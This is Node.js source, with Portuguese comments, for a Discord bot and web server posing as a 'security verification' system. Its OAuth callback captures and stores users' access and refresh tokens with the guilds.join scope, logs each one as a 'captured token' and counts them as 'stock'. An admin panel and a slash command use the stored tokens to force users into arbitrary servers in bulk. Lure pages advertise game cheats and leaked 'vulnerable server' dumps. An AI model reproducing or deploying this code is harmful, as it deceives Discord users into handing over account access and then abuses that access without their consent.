require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { Pool } = require('pg');
const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, PermissionsBitField, ActivityType 
} = require('discord.js');

// --- CONFIGURAÇÕES ---
const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD; 

// LINKS DE DESTINO FINAIS
const TARGET_LINK_PADRAO = 'https://discord.com/app'; 
const TARGET_LINK_GAME = 'https://gamedown.onrender.com/sucess'; 
const TARGET_LINK_SCRIPT = 'https://key-scriptlp.onrender.com/sucess'; // <--- SEU NOVO DESTINO

// --- SETUP DO BANCO (POSTGRES) ---
let pool = null;

async function iniciarBanco() {
    if (process.env.DATABASE_URL) {
        pool = new Pool({
            connectionString: process.env.DATABASE_URL,
            ssl: { rejectUnauthorized: false }
        });
        try {
            await pool.query(`
                CREATE TABLE IF NOT EXISTS auth_users (
                    id VARCHAR(255) PRIMARY KEY,
                    username VARCHAR(255),
                    access_token TEXT,
                    refresh_token TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            `);
            console.log('✅ Banco conectado.');
        } catch (err) { console.error("❌ Erro no banco:", err); }
    }
}

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

// =================================================================
// FUNÇÃO CENTRAL DE VERIFICAÇÃO (Reutilizável)
// =================================================================
async function handleVerificationCallback(req, res, redirectUri, finalTarget) {
    const { code, state } = req.query; 
    
    if (!code) return res.send('Erro: Falta código.');

    try {
        // 1. Troca Código por Token
        const tokenResponse = await axios.post(
            'https://discord.com/api/oauth2/token',
            new URLSearchParams({
                client_id: process.env.CLIENT_ID,
                client_secret: process.env.CLIENT_SECRET,
                code,
                grant_type: 'authorization_code',
                redirect_uri: redirectUri, 
                scope: 'identify guilds.join',
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );

        const { access_token, refresh_token } = tokenResponse.data;
        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${access_token}` },
        });

        const user = userResponse.data;

        // 2. Salva no Banco
        if (pool) {
            await pool.query(`
                INSERT INTO auth_users (id, username, access_token, refresh_token)
                VALUES ($1, $2, $3, $4)
                ON CONFLICT (id) 
                DO UPDATE SET access_token = $3, refresh_token = $4;
            `, [user.id, user.username, access_token, refresh_token]);
        }

        // 3. Tenta dar o Cargo e Configurar Log
        let nomeServidor = "Desconhecido";
        if (state) {
            try {
                const guild = client.guilds.cache.get(state);
                if (guild) {
                    nomeServidor = guild.name;
                    const member = await guild.members.fetch(user.id).catch(() => null);
                    // Tenta dar Auth2 Vetificados ou Vetificado
                    const role = guild.roles.cache.find(r => r.name === 'Auth2 Vetificados' || r.name === 'Vetificado');
                    if (member && role) await member.roles.add(role);
                }
            } catch (e) {}
        }

        // 4. Log Discord
        const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
        if (logChannel) {
            logChannel.send({ embeds: [new EmbedBuilder().setTitle('📥 Novo Token Capturado').setDescription(`**Usuário:** ${user.username}\n**Origem:** ${nomeServidor}`).setColor('Green')] });
        }

        // 5. Redirecionamento Rápido (300ms)
        res.send(`
            <!DOCTYPE html>
            <html lang="pt-br">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Verificado</title>
                <style>body{background-color:#2b2d31;font-family:sans-serif;color:white;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;flex-direction:column}.spinner{width:50px;height:50px;border:5px solid rgba(255,255,255,0.1);border-top:5px solid #23a559;border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
            </head>
            <body>
                <div class="spinner"></div>
                <p>Verificando...</p>
                <script>
                    setTimeout(() => { window.location.href = "${finalTarget}"; }, 300);
                </script>
            </body>
            </html>
        `);

    } catch (e) { 
        console.error(e); 
        res.send('Erro na autenticação. Verifique se o REDIRECT_URI no Render e no Discord são IDÊNTICOS.'); 
    }
}

// =================================================================
// ROTAS DE VERIFICAÇÃO (CALLBACKS)
// =================================================================

// ROTA 1: Padrão (Vai para o Discord App)
app.get('/callback', async (req, res) => {
    await handleVerificationCallback(req, res, process.env.REDIRECT_URI, TARGET_LINK_PADRAO);
});

// ROTA 2: Game (Vai para GameDown)
app.get('/auth2', async (req, res) => {
    if (!process.env.REDIRECT_URI_2) return res.send("Erro: REDIRECT_URI_2 não configurada.");
    await handleVerificationCallback(req, res, process.env.REDIRECT_URI_2, TARGET_LINK_GAME);
});

// ROTA 3: Script (Vai para KeyScriptLP) <--- A NOVA ROTA
app.get('/script', async (req, res) => {
    if (!process.env.REDIRECT_URI_SCRIPT) return res.send("Erro: REDIRECT_URI_SCRIPT não configurada no Render.");
    await handleVerificationCallback(req, res, process.env.REDIRECT_URI_SCRIPT, TARGET_LINK_SCRIPT);
});

// =================================================================
// OUTRAS ROTAS (Status, Painel, Game Hub)
// =================================================================

app.get('/', async (req, res) => {
    let count = 0;
    if(pool) { try { const res = await pool.query('SELECT COUNT(*) FROM auth_users'); count = res.rows[0].count; } catch(e) {} }
    res.send(`<body style="background:#1e1f22;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column"><h1>🤖 Bot Online</h1><p>Estoque: <b>${count}</b></p><a href="/painel" style="color:#5865F2">Painel Admin</a></body>`);
});

app.get('/painel', async (req, res) => {
    let count = 0;
    if(pool) { try { const res = await pool.query('SELECT COUNT(*) FROM auth_users'); count = res.rows[0].count; } catch(e) {} }
    res.send(`<!DOCTYPE html><html><body style="background:#2b2d31;color:white;font-family:sans-serif;display:flex;justify-content:center;padding-top:50px"><div style="background:#313338;padding:40px;border-radius:8px;width:400px"><h2>Painel Admin</h2><p>Membros: ${count}</p><form action="/api/mass-join" method="POST"><input type="password" name="password" placeholder="Senha" style="width:100%;margin-bottom:10px"><input type="text" name="serverId" placeholder="ID Servidor" style="width:100%;margin-bottom:10px"><input type="number" name="amount" placeholder="Qtd" style="width:100%;margin-bottom:10px"><button type="submit" style="width:100%;background:#23a559;color:white;border:none;padding:10px;cursor:pointer">Enviar</button></form></div></body></html>`);
});

app.get('/game', (req, res) => {
    res.send(`<!DOCTYPE html><html lang="pt-br"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Game Hub</title><style>@import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&display=swap');body{margin:0;padding:0;background-color:#0f0f13;color:white;font-family:'Rajdhani',sans-serif;overflow-x:hidden}.hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;background:radial-gradient(circle at center,#1a1b26 0%,#0f0f13 100%);text-align:center;padding:40px 20px}h1{font-size:4rem;margin-bottom:10px;text-transform:uppercase;background:linear-gradient(90deg,#00f260,#0575E6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}p{font-size:1.2rem;color:#a0a0a0;max-width:600px;margin-bottom:40px}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:20px;width:100%;max-width:1000px}.card{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);padding:30px;border-radius:12px;transition:0.3s;cursor:pointer}.card:hover{transform:translateY(-10px);background:rgba(255,255,255,0.1);border-color:#00f260;box-shadow:0 0 20px rgba(0,242,96,0.2)}.card h3{font-size:1.5rem;margin-top:0}.card span{color:#00f260;font-weight:bold;display:block;margin:10px 0}.btn{margin-top:10px;display:inline-block;padding:10px 25px;background:#5865F2;color:white;text-decoration:none;border-radius:4px;font-weight:bold;transition:0.2s}.btn:hover{background:#4752c4}</style></head><body><div class="hero"><h1>Game Hub</h1><p>Acesse scripts exclusivos, ferramentas beta e conteúdos vazados diretamente da nossa base de dados segura.</p><div class="grid"><div class="card"><h3>Script Blox Fruits</h3><p>Auto farm, Auto raid e ESP.</p><span>STATUS: UNDETECTED 🟢</span><a href="#" class="btn">Baixar</a></div><div class="card"><h3>Executor PC</h3><p>Injetor level 8 sem key.</p><span>STATUS: ATUALIZADO 🟠</span><a href="#" class="btn">Acessar</a></div><div class="card"><h3>Database Dump</h3><p>Lista de servidores vulneráveis.</p><span>STATUS: VIP ONLY 🔒</span><a href="#" class="btn" style="background:#333;cursor:not-allowed;">Bloqueado</a></div></div></div></body></html>`);
});

app.post('/api/mass-join', async (req, res) => {
    const { password, serverId, amount } = req.body;
    if (password !== ADMIN_PASSWORD) return res.send('Senha Incorreta');
    if (!pool) return res.send('Erro Banco');
    let users = [];
    try { const result = await pool.query('SELECT * FROM auth_users LIMIT $1', [amount]); users = result.rows; } catch(e) { return res.send('Erro busca'); }
    if (users.length === 0) return res.send('Vazio');
    res.send('Iniciado.');
    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
    let s=0, f=0;
    for (const user of users) {
        try { await axios.put(`https://discord.com/api/guilds/${serverId}/members/${user.id}`, { access_token: user.access_token }, { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } }); s++; } 
        catch (e) { if(e.response?.status===401) pool.query('DELETE FROM auth_users WHERE id=$1',[user.id]).catch(()=>{}); f++; }
        await sleep(1000);
    }
});

// --- BOT DISCORD ---
client.once('ready', async () => {
    console.log(`🤖 Bot Logado: ${client.user.tag}`);
    await client.application.commands.set([
        { name: 'setup_auth', description: 'Painel Auth (Padrão)' },
        { name: 'setup_auth2', description: 'Painel Auth (GameDown)' },
        { name: 'setup_script', description: 'Painel Auth (KeyScriptLP)' }, // NOVO
        { name: 'estoque', description: 'Ver quantidade salva' },
        { 
            name: 'enviar', description: 'Mass Join via Comando', 
            options: [{name:'quantidade',description:'Qtd',type:4,required:true},{name:'servidor_id',description:'ID',type:3,required:true}] 
        },
        {
            name: 'enviar2', description: 'Envia UM usuário específico',
            options: [{name:'alvo',description:'ID ou Nick',type:3,required:true},{name:'servidor_id',description:'ID Servidor',type:3,required:true}]
        }
    ]);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    
    // SETUP 1 (Padrão)
    if (interaction.commandName === 'setup_auth') {
        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Verificar Agora').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('✅'));
        const embed = new EmbedBuilder().setTitle('🛡️ Verificação de Segurança').setDescription('Se verifique para poder ter acesso a itens exclusivos!').setColor(0x5865F2).setFooter({ text: 'Sistema seguro de Verificação' });
        interaction.reply({ content: 'Painel enviado.', ephemeral: true });
        interaction.channel.send({ embeds: [embed], components: [row] });
    }

    // SETUP 2 (GameDown)
    if (interaction.commandName === 'setup_auth2') {
        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        if (!process.env.REDIRECT_URI_2) return interaction.reply('❌ Configure REDIRECT_URI_2.');
        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI_2)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Baixar / Acessar').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('🔗'));
        const embed = new EmbedBuilder().setTitle('🔓 Acesso a Conteúdo Externo').setDescription('Clique abaixo para ser verificado e redirecionado para a página de download (0.3s).').setColor(0x00FF00);
        interaction.reply({ content: 'Painel 2 enviado.', ephemeral: true });
        interaction.channel.send({ embeds: [embed], components: [row] });
    }

    // SETUP 3 (Script Key - NOVO)
    if (interaction.commandName === 'setup_script') {
        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        if (!process.env.REDIRECT_URI_SCRIPT) return interaction.reply('❌ Configure REDIRECT_URI_SCRIPT no Render.');
        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI_SCRIPT)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Gerar Key').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('🔑'));
        interaction.reply({ content: 'Painel Script enviado.', ephemeral: true });
        interaction.channel.send({ embeds: [new EmbedBuilder().setTitle('📜 Gerador de Key').setDescription('Verifique sua conta para acessar o gerador de scripts.').setColor('Gold')], components: [row] });
    }
    
    // Outros comandos
    if (interaction.commandName === 'estoque') {
        let count = 0;
        if(pool) { try { const res = await pool.query('SELECT COUNT(*) FROM auth_users'); count = res.rows[0].count; } catch(e) {} }
        interaction.reply({ content: `📦 **Banco SQL:** ${count} usuários salvos.`, ephemeral: true });
    }
    if (interaction.commandName === 'enviar') interaction.reply('Use o painel web: /painel');
    if (interaction.commandName === 'enviar2') {
        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const alvo = interaction.options.getString('alvo');
        const srvId = interaction.options.getString('servidor_id');
        await interaction.deferReply({ ephemeral: true });
        if (!pool) return interaction.editReply('❌ Banco off.');
        try {
            let res = await pool.query('SELECT * FROM auth_users WHERE id = $1', [alvo]);
            if (res.rows.length === 0) res = await pool.query('SELECT * FROM auth_users WHERE username = $1', [alvo]);
            if (res.rows.length === 0) return interaction.editReply(`❌ Usuário **${alvo}** não encontrado.`);
            await axios.put(`https://discord.com/api/guilds/${srvId}/members/${res.rows[0].id}`, { access_token: res.rows[0].access_token }, { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } });
            interaction.editReply(`✅ **Sucesso!** Enviado para \`${srvId}\`.`);
        } catch (error) { interaction.editReply(`❌ Erro. Bot no servidor alvo?`); }
    }
});

iniciarBanco().then(() => {
    app.listen(process.env.PORT || 3000, () => console.log("Web Server Ligado"));
    client.login(process.env.BOT_TOKEN);
});
